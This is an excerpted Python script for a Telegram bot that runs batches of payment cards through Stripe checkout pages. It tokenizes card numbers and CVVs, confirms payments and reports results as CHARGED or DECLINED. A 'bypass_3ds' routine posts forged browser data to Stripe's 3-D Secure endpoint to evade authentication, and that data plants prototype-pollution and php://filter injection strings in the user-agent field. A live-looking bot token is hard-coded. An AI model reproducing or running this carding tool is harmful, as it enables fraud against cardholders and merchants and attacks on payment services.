...
BOT_TOKEN  = "8647852751:AAEs4wptc9gyLeLYJdCxnTX-Wg_4yB-kvq8"   # ← paste your bot token
ADMIN_ID   = "8233015284"
...
async def charge_card(cc_str: str, session: CheckoutSession) -> dict:
    ...
    pk = session.pk; cs = session.cs; init_data = session.init_data

    email     = (init_data.get("customer_email") or
                 (init_data.get("customer") or {}).get("email") or "john@example.com")
    ...
    total = subtotal = 0
    if lig:
        total = lig.get("total") or 0; subtotal = lig.get("subtotal") or 0
    elif inv:
        total = inv.get("total") or 0; subtotal = inv.get("subtotal") or 0
    else:
    ...
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as s:
            ...
            # Step 1 — Tokenize
            tok_body = "&".join([
                f"card[number]={card['cc']}",     f"card[cvc]={card['cvv']}",
                f"card[exp_month]={card['month']}",f"card[exp_year]={card['year']}",
                f"card[name]={name}",              f"card[address_country]={country}",
                f"card[address_line1]={line1}",    f"card[address_city]={city}",
                f"card[address_state]={state}",    f"card[address_zip]={zip_code}",
                f"key={pk}", "pasted_fields=number",
                "payment_user_agent=stripe.js/b3f6c00c8a; stripe-js-v3/b3f6c00c8a; checkout",
                "referrer=https://checkout.stripe.com", "time_on_page=32567",
            ])
            tok_headers = {
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded",
            ...
            async with s.post("https://api.stripe.com/v1/tokens",
                               headers=tok_headers, data=tok_body) as r:
                tok = await r.json(content_type=None)

            if "error" in tok:
                result.update(status="DECLINED",
                              response=tok["error"].get("message", "Card error"),
                              time=round(time.time() - start, 1))
                return result

            token_id = tok.get("id")
            if not token_id:
                result.update(status="FAILED", response="No Token",
                              time=round(time.time() - start, 1))
                return result

            # Step 2 — Payment method
            pm_body = "&".join([
                "type=card", f"card[token]={token_id}",
            ...
            async with s.post("https://api.stripe.com/v1/payment_methods",
                               headers=STRIPE_HEADERS, data=pm_body) as r:
                pm = await r.json(content_type=None)

            if "error" in pm:
                result.update(status="DECLINED",
                              response=pm["error"].get("message", "Card error"),
                              time=round(time.time() - start, 1))
                return result

            pm_id = pm.get("id")
            if not pm_id:
                result.update(status="FAILED", response="No PM",
                              time=round(time.time() - start, 1))
                return result

            # Step 3 — Confirm
            conf_body = "&".join([
                "eid=NA", f"payment_method={pm_id}",
                ...
                f"key={pk}", f"init_checksum={checksum}",
                "consent[terms_of_service]=accepted",
            ])
            async with s.post(
                f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
                headers=STRIPE_HEADERS, data=conf_body
            ) as r:
            ...
            if "error" in conf:
                ...
                result.update(status="DECLINED",
                              response=f"{dc.upper()}: {msg}" if dc else msg)
            else:
                ...
                if st == "succeeded":
                    ...
                    # Real 3DS bypass: authenticate via /v1/3ds2/authenticate with curl_cffi
                    bypassed = await bypass_3ds(
                        pk=pk,
                        pi_id=pi_id,
                        pi_cs=pi_cs,
                        pm_id=pm_id,
                        threedsid=pi.get("next_action", {}).get("use_stripe_sdk", {}).get("server_transaction_id"),
                        payatt=pi.get("next_action", {}).get("use_stripe_sdk", {}).get("three_d_secure_2_source"),
                        card_number=card["cc"],
                    )
                    if bypassed:
                        result.update(status="CHARGED", response="3DS Bypassed - Payment Successful")
                    else:
                        result.update(status="3DS", response="3DS Required")
...
def _card_brand_from_number(number: str) -> str:
    n = number.replace(" ", "")
    if n.startswith("4"):
        return "visa"
    if n.startswith(("34", "37")):
        return "amex"
    if n.startswith(("51", "52", "53", "54", "55")) or (222100 <= int(n[:6]) <= 272099):
        return "mastercard"
...
def _build_browser_json(threedsid: str, brand: str) -> str:
    # Static bypass configs per brand (same values used in the main bot)
    configs = {
        "amex": {
            ...
            "browsertz": "-300",
            "browseruseragent": '{"__proto__": {"isAdmin": true}}',
        ...
        "visa": {
            ...
            "browserscreenwidth": "1707",
            "browsertz": "-300",
            "browseruseragent": "php://filter/resource=php://input%00",
            "challengewindowsize": "null",
        },
        "mastercard": {
            "fingerprintattempted": "true",
    ...
    cfg = configs.get(brand, configs["visa"])
    ...
    fingerprint_json = {"threeDSServerTransID": threedsid}
    fpd = base64.b64encode(json.dumps(fingerprint_json, separators=(",", ":")).encode()).decode().rstrip("=")

    browser_obj = {
        "fingerprintAttempted": _parse_val(cfg["fingerprintattempted"]),
        "fingerprintData": fpd,
        "challengeWindowSize": _parse_val(cfg["challengewindowsize"]),
        "threeDSCompInd": str(cfg["threedscompind"]),
        "browserJavaEnabled": _parse_val(cfg["browserjavaenabled"]),
        "browserJavascriptEnabled": _parse_val(cfg["browserjavascriptenabled"]),
        "browserLanguage": str(cfg["browserlanguage"]),
        "browserColorDepth": str(cfg["browsercolordepth"]),
        "browserScreenHeight": str(cfg["browserscreenheight"]),
        "browserScreenWidth": str(cfg["browserscreenwidth"]),
        "browserTZ": str(cfg["browsertz"]),
        "browserUserAgent": cfg["browseruseragent"],
    }
    return json.dumps(browser_obj, separators=(",", ":"))


async def bypass_3ds(pk: str, pi_id: str, pi_cs: str, pm_id: str, threedsid: Optional[str],
                   payatt: Optional[str], card_number: str) -> bool:
    """Attempt to bypass 3DS via /v1/3ds2/authenticate using curl_cffi."""
    if not threedsid or not payatt:
        return False
    try:
    ...
    brand = _card_brand_from_number(card_number)
    browser_json = _build_browser_json(threedsid, brand)
    ...
    try:
        ...
        def _do_authenticate():
            return s.post("https://api.stripe.com/v1/3ds2/authenticate", data=payload, headers=headers)

        c_resp = await asyncio.to_thread(_do_authenticate)
        try:
            auth_data = c_resp.json()
        except Exception:
            auth_data = {}
        err = auth_data.get("error") or {}
        if (
            err.get("errorComponent") == "D"
            or auth_data.get("state") in ("processing_error", "success")
            or auth_data.get("status") in ("succeeded",)
        ):
            return True
    except Exception:
        pass
